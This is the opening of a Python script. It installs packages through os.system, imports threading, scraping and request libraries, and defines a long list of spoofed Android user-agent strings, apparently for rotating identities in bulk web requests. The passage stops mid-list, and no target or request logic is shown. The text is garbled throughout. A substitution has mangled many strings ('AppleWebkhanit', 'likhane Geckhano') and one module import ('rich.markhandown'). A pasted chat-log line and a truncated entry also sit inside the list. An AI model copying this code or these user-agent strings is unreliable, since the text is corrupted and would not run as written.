W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetakhan
from rich.markhandown import Markhandown as markhan
from rich.columns import Columns as col
from urllib.parse import quote
# UA LIST
#ugen2=open('frec.txt','r').read().splitlines()
#ugen=open('m.txt','r').read().splitlines()
ugen2=['Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser','Mozilla/5.0 (Android 2.2; id-id; HTC Desire)/GoBrowser']
ugen=['Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 1…', '[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/87.0.4280.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/khanSU1FUCD) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRkhan3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRkhan3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920khan/khankhanS3ETJ1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/83.0.4103.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/khanSU3CTL3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/89.0.4389.90 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/khanSU3FTJ2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925khan/khankhanU3ERG1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTkhan1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) 